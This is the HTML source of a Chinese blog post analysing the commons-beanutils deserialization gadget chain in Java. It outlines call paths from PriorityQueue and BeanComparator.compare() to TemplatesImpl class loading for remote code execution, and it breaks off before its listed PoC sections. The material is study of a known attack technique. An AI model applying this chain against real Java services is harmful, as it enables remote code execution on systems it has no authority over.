@@ -1,0 +1,1268 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" CB链 参考文章：Java反序列化CB链 | root@wanth3f1ag、JAVA反序列化——CB链 - Infernity&rsquo;s Blog\n依赖：jdk：jdk8u65，CB：commons-beanutils 1.8.3\n">
+<title>CB链</title>
+
+<link rel='canonical' href='https://luo-kaihong.github.io/p/cb%E9%93%BE/'>
+
+<link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="CB链">
+<meta property='og:description' content=" CB链 参考文章：Java反序列化CB链 | root@wanth3f1ag、JAVA反序列化——CB链 - Infernity&rsquo;s Blog\n依赖：jdk：jdk8u65，CB：commons-beanutils 1.8.3\n">
+<meta property='og:url' content='https://luo-kaihong.github.io/p/cb%E9%93%BE/'>
+<meta property='og:site_name' content='zhizuijimi'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2026-01-14T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2026-01-14T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="CB链">
+<meta name="twitter:description" content=" CB链 参考文章：Java反序列化CB链 | root@wanth3f1ag、JAVA反序列化——CB链 - Infernity&rsquo;s Blog\n依赖：jdk：jdk8u65，CB：commons-beanutils 1.8.3\n">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_a4e3a2ed64404d6b.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">💗</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">zhizuijimi</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://mpbeta.csdn.net/mp_blog/manage/article?spm=1011.2124.3001.10336'
+                        target="_blank"
+                        title="csdn"
+                        rel="me"
+                    >
+                        
+                        
+                            <?xml version="1.0" ?><!DOCTYPE svg  PUBLIC '-//W3C//DTD SVG 1.1//EN'  'http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd'><svg enable-background="new 0 0 156.457 156.457" height="156.457" id="Layer_1" overflow="visible" version="1.1" viewBox="0 0 156.457 156.457" width="156.457" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g id="icon"><circle cx="78.229" cy="78.229" fill="#EF7A2B" r="78.229"/><path d="M64.616,117.315c-9.653-0.584-16.453-4.751-19.793-12.154c-1.493-3.292-2.118-6.459-2.153-10.876   c-0.021-2.306,0.403-27.915,0.549-33.193c0.146-5.563,1.188-9.532,3.424-13.019c3.174-4.969,7.667-7.785,14.265-8.879   c2.542-0.424,24.8-0.875,26.96-0.521c5.001,0.827,8.932,2.858,12.224,6.306c2.694,2.823,4.444,6.236,5.257,10.271   c0.563,2.816,0.625,9.584,0.104,12.345c-0.194,0.983-0.223,1.386-0.104,1.386c0.091,0,0.868,0.066,1.716,0.149   c3.403,0.319,5.966,1.132,7.91,2.503c3.396,2.389,5,5.661,5.368,10.928c0.223,3.098,0.181,11.348-0.055,13.293   c-0.792,6.25-2.952,10.979-6.765,14.778c-3.577,3.57-7.737,5.57-13.522,6.501c-1.306,0.208-3.326,0.236-17.467,0.264   C73.735,117.412,65.672,117.371,64.616,117.315L64.616,117.315L64.616,117.315z M99.202,99.036   c1.285-0.334,2.153-0.819,3.091-1.765c2.188-2.194,2.632-5.319,1.16-8.209c-0.417-0.813-1.64-2.027-2.584-2.556   c-1.659-0.931-0.902-0.889-19.335-0.889c-14.862,0-16.786,0.021-17.612,0.223c-3.07,0.757-5.139,3.417-5.139,6.598   c0,1.938,0.66,3.535,2.021,4.868c0.931,0.91,1.632,1.326,2.896,1.688c0.785,0.229,2.097,0.25,17.745,0.264   C96.376,99.258,98.438,99.237,99.202,99.036L99.202,99.036z M85.841,67.988c0.444-0.167,1.139-0.552,1.541-0.854   c4.438-3.333,3.334-10.125-1.958-12.008c-0.569-0.205-1.515-0.267-5.376-0.368c-8.25-0.208-13.695-0.188-14.445,0.052   c-1.194,0.385-2.167,0.972-2.965,1.785c-3.57,3.615-2.167,9.55,2.667,11.275c0.729,0.264,1.34,0.302,6.424,0.417   C83.465,68.551,84.382,68.533,85.841,67.988L85.841,67.988L85.841,67.988z" fill="#FFFFFF"/></g></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#漏洞分析">漏洞分析：</a></li>
+    <li><a href="#什么是-javabean">什么是 javabean：</a></li>
+    <li><a href="#链子分析">链子分析</a>
+      <ol>
+        <li><a href="#beancomparatorcompare">BeanComparator.compare()</a></li>
+        <li><a href="#poc1with-cc依赖">poc1(with CC依赖)</a></li>
+        <li><a href="#poc2without-cc依赖">poc2(without CC依赖)</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/java/" style="background-color: #000000; color: #fff;">
+                java
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/cb%E9%93%BE/">CB链</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2026-01-14</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 8 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <hr>
+<h1 id="cb链">CB链
+</h1><p>参考文章：<a class="link" href="https://wanth3f1ag.top/2025/07/06/Java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96CB%e9%93%be/"  target="_blank" rel="noopener"
+    >Java反序列化CB链 | root@wanth3f1ag</a>、<a class="link" href="https://infernity.top/2024/04/24/JAVA%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96-CB%e9%93%be/"  target="_blank" rel="noopener"
+    >JAVA反序列化——CB链 - Infernity&rsquo;s Blog</a></p>
+<p>依赖：jdk：jdk8u65，CB：commons-beanutils 1.8.3</p>
+<p>在pom.xml里添加</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">dependency</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="o">&lt;</span><span class="n">groupId</span><span class="o">&gt;</span><span class="n">commons</span><span class="o">-</span><span class="n">beanutils</span><span class="o">&lt;/</span><span class="n">groupId</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="o">&lt;</span><span class="n">artifactId</span><span class="o">&gt;</span><span class="n">commons</span><span class="o">-</span><span class="n">beanutils</span><span class="o">&lt;/</span><span class="n">artifactId</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="o">&lt;</span><span class="n">version</span><span class="o">&gt;</span><span class="n">1</span><span class="p">.</span><span class="na">8</span><span class="p">.</span><span class="na">3</span><span class="o">&lt;/</span><span class="n">version</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">&lt;/</span><span class="n">dependency</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">&lt;</span><span class="n">dependency</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="o">&lt;</span><span class="n">groupId</span><span class="o">&gt;</span><span class="n">commons</span><span class="o">-</span><span class="n">logging</span><span class="o">&lt;/</span><span class="n">groupId</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="o">&lt;</span><span class="n">artifactId</span><span class="o">&gt;</span><span class="n">commons</span><span class="o">-</span><span class="n">logging</span><span class="o">&lt;/</span><span class="n">artifactId</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="o">&lt;</span><span class="n">version</span><span class="o">&gt;</span><span class="n">1</span><span class="p">.</span><span class="na">2</span><span class="o">&lt;/</span><span class="n">version</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">&lt;/</span><span class="n">dependency</span><span class="o">&gt;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="漏洞分析">漏洞分析：
+</h2><h2 id="什么是-javabean">什么是 javabean：
+</h2><p>CommonsBeanutils 是应用于 javabean 的工具，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法，<strong>JavaBean</strong> 是一种特殊的 Java 类，它遵循一定的命名约定和设计模式，目的是为了组件的<strong>可重用性、易用性</strong>和在不同环境（如可视化开发工具、框架）中的<strong>互操作性</strong>。可以把 JavaBean 想象成一个标准化的、自包含的软件组件，它能够通过简单的方式被其他组件或工具使用和操作。</p>
+<p>其必须满足几个规则</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1.必须有无参构造函数 (public 且无参数)：框架（如 Spring、Tomcat、Commons-BeanUtils）在底层都是用反射机制 Class.newInstance() 来创建对象的，如果没有无参构造，框架就不知道怎么创建它
+</span></span><span class="line"><span class="cl">2.属性必须私有化 (private)：原因： 保护数据，不让外部直接修改字段。
+</span></span><span class="line"><span class="cl">3.必须提供公开的 Getter 和 Setter 方法：外界只能通过 getXxx() 和 setXxx() 来读写数据。框架通过方法名（去掉 get/set 后首字母小写）来推断属性名。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>commons-beanutils中提供了一个静态方法<code>PropertyUtils.getProperty()</code>，可以让使用者直接调用任意JavaBean的getter方法,我们来看看该方法的定义</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">getProperty</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">bean</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="p">,</span><span class="w"> </span><span class="n">InvocationTargetException</span><span class="p">,</span><span class="w"> </span><span class="n">NoSuchMethodException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">PropertyUtilsBean</span><span class="p">.</span><span class="na">getInstance</span><span class="p">().</span><span class="na">getProperty</span><span class="p">(</span><span class="n">bean</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>一个是JavaBean实例，一个是JavaBean的属性</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Person</span><span class="w"> </span><span class="n">person</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Person</span><span class="p">(</span><span class="s">&#34;Mike&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">PropertyUtils</span><span class="p">.</span><span class="na">getProperty</span><span class="p">(</span><span class="n">person</span><span class="p">,</span><span class="s">&#34;name&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="err">#</span><span class="w"> </span><span class="n">等价于</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">Person</span><span class="w"> </span><span class="n">person</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Person</span><span class="p">(</span><span class="s">&#34;Mike&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">person</span><span class="p">.</span><span class="na">getName</span><span class="p">();</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>需要注意的是，<code>PropertyUtils.getProperty</code> 还支持递归获取属性，比如a对象中有属性b，b对象中有属性c，我们可以通过 <code>PropertyUtils.getProperty(a, “b.c”); </code>的方式进行递归获取。通过这个方法，使用者可以很方便地调用任意对象的getter。</p>
+<p>因此，如果getter方法存在可以rce的点可以利用的话，就存在安全问题了。</p>
+<p>回顾一下之前的CC3，是通过利用TemplatesImpl类的方法去动态加载恶意类从而进行RCE</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">TemplatesImpl</span><span class="p">::</span><span class="n">newTransformer</span><span class="p">()</span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">TemplatesImpl</span><span class="p">::</span><span class="n">getTransletInstance</span><span class="p">()</span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TemplatesImpl</span><span class="p">::</span><span class="n">defineTransletClasses</span><span class="p">()</span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">TemplatesImpl</span><span class="p">::</span><span class="n">defineClass</span><span class="p">()</span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">恶意类代码执行</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>再看看CC4的链子，，是通过TransformingComparator#compare()去触发transform方法的调用从而实现RCE的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">PriorityQueue</span><span class="err">#</span><span class="n">readObject</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">PriorityQueue</span><span class="err">#</span><span class="n">heapify</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">PriorityQueue</span><span class="err">#</span><span class="n">siftDown</span><span class="p">()</span><span class="w">    
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">PriorityQueue</span><span class="err">#</span><span class="n">siftDownUsingComparator</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">TransformingComparator</span><span class="err">#</span><span class="n">compare</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    					</span><span class="n">ChainedTransformer</span><span class="err">#</span><span class="n">transform</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                        	</span><span class="n">InstantiateTransformer</span><span class="err">#</span><span class="n">transform</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                            	</span><span class="n">TemplatesImpl</span><span class="err">#</span><span class="n">newTransformer</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                                	</span><span class="n">defineClass</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">newInstance</span><span class="p">()</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>而我们的Commons-beanutils利用链中的核心触发位置就是<code>BeanComparator.compare()</code> 函数，<code>BeanComparator.compare()</code> 函数内部会调用getProperty()方法，进而可以调用JavaBean中对应属性的getter方法</p>
+<h2 id="链子分析">链子分析
+</h2><h3 id="beancomparatorcompare">BeanComparator.compare()
+</h3><p>我们看一下<code>BeanComparator.compare()</code> 函数</p>
+<p><img src="/p/cb%E9%93%BE/image-20260114194408062.png"
+	width="1058"
+	height="486"
+	srcset="/p/cb%E9%93%BE/image-20260114194408062_hu_5c4e833c8ba6c180.png 480w, /p/cb%E9%93%BE/image-20260114194408062_hu_3f5091df2a34b110.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260114194408062"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="217"
+		data-flex-basis="522px"
+	
+></p>
+<p>这里会调用PropertyUtils#getProperty()方法，简单分析一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">这个方法接收两个对象传入，如果 property 变量是 null则直接比较这两个对象，这时候会直接用comparator实例的compare方法对这两个对象进行比较
+</span></span><span class="line"><span class="cl">如果this.property不为空，则用PropertyUtils.getProperty分别取这两个对象的this.property属性，比较属性的值。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在 ysoserial 中利用其来调用了 Temlatesimpl.getOutputProperties() 方法也就是Temlatesimpl类中的 <code>_outputProperties</code> 属性的 getter 方法，所以这里让 o1 为templates对象，然后property为TemplatesImpl的 <code>_outputProperties</code> 属性，即可调用 <code>TemplatesImpl.getOutputProperties()</code>， 往下就是TemplatesImpl的利用链。</p>
+<p>来看一下BeanComparator的构造函数</p>
+<p><img src="/p/cb%E9%93%BE/image-20260114232925466.png"
+	width="1149"
+	height="437"
+	srcset="/p/cb%E9%93%BE/image-20260114232925466_hu_a5f82df75f13f417.png 480w, /p/cb%E9%93%BE/image-20260114232925466_hu_66e9f72dcb1e469.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260114232925466"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="262"
+		data-flex-basis="631px"
+	
+></p>
+<p><strong>java编译器会根据参数数量和类型匹配相应的构造函数</strong>，比如处理这个property属性的值</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">BeanComparator comparator = new BeanComparator(&#34;outputProperties&#34;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>就是调用这个构造函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
